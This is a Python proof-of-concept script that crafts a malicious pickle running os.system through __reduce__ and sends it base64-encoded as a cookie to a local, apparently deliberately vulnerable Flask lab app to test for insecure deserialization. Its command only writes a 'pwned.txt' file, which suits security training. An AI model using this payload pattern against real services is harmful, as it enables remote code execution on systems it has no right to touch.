import pickle
import base64
import requests
import os

# Create a malicious pickle that will execute a command
class Exploit(object):
    def __reduce__(self):
        # This command will create a file called "pwned.txt" when unpickled
        return (os.system, ('echo You got hacked! > pwned.txt',))

# Create the malicious pickle
malicious_pickle = pickle.dumps(Exploit())

# Encode it to base64 (format the app expects)
payload = base64.b64encode(malicious_pickle).decode()

print("=" * 50)
print("Testing Pickle Deserialization Vulnerability")
print("=" * 50)
print(f"\nMalicious Payload: {payload}\n")

# Send request with malicious cookie
url = "http://127.0.0.1:4000/cookie"
cookies = {'value': payload}

print("Sending malicious cookie to the app...")
response = requests.get(url, cookies=cookies)

print(f"Response status: {response.status_code}")
print("\nCheck your breakableflask folder for 'pwned.txt' file!")
print("If file exists = VULNERABLE!")